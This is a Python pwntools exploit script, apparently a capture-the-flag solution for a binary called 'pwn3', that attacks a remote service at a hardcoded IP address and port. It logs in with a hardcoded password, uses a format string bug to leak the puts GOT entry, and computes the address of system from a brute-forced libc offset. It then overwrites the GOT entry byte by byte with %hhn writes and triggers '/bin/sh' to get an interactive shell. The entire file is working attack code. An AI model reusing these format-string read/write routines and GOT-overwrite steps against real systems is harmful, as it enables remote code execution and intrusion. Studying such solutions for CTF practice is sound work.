from pwn import *
import os
filenum=0
cmd=''
#brute the offset...
#off=[159568,158816,168720,168032,175664,170560,164432,166608,171264,173440,173328,174624,174640,153712,152976,162720,162032,165872,160496,151360,151360,153600,158000,160240,157888,159712,159712,165728,153536,164976,152672,175184,162352,174432,161664,181328,165168,174832,158960,169968,152768,169968,152768,172928,155104,176768,159392,179728,161728,178864,159296,181856,161776,181760,161776]
def splitnum(n,x=0):
	assert (x<4)&(x>=0)
	return (n&(255<<(x*8)))>>(x*8)
def formatwrite(addr,value,offset):
	payload=''
	n=[]
	for i in xrange(4):
		payload+=p32(addr+i)+'junk'
		n.append(splitnum(value,i))
	payload=payload[:-4]
	l=len(payload)+offset*8
	payload+='%08x'*offset
	for i in xrange(4):
		padnum=n[i]-l
		if padnum<1:
			padnum+=256
		l=n[i]
		payload+='%0{}x%hhn'.format(padnum)
	return payload
def formatread(addr,offset):
	payload=''
	payload=p32(addr)
	payload+='%08x'*offset
	payload+='%s'
	return payload
def leak(addr):
	global filenum
	if '00' in hex(addr):
		print 'bad:'+hex(addr)
		return 0
#	print 'leaking:'+hex(addr)
	p.sendline('put')
	p.recvuntil(':')
	p.sendline(str(filenum))
	filenum+=1
	p.recvuntil(':')
	f=formatread(addr,6)
	p.sendline(f)
	p.recvuntil('>')
	p.sendline('get')
	p.recvuntil(':')
	p.sendline(str(filenum-1))
	p.recvuntil('420')
	data=p.recv(4)
	p.recv()
#	p.recvuntil('>')
#	print "%#x => %s" % (addr, (data or '').encode('hex'))
	return data
#p=process('./pwn3')
offset=152768
filenum=0
p=remote('120.27.155.82','9000')
p.recvuntil(':')
p.sendline('rxraclhm')
p.recvuntil('>')
puts=u32(leak(0x804A028))
system=puts-offset
print 'puts:'+hex(puts)
print 'system:'+hex(system)
#raw_input()
p.sendline('put')
p.recvuntil(':')
p.sendline(str(filenum))
filenum+=1
p.recvuntil(':')
f=formatwrite(0x804A028,system,5)
p.sendline(f)
p.recvuntil('>')
p.sendline('get')
p.recvuntil(':')
p.sendline(str(filenum-1))
p.recv()
p.sendline('put')
p.recvuntil(':')
p.sendline('/bin/sh;')
p.recvuntil(':')
p.sendline('aaaaa')
p.interactive()
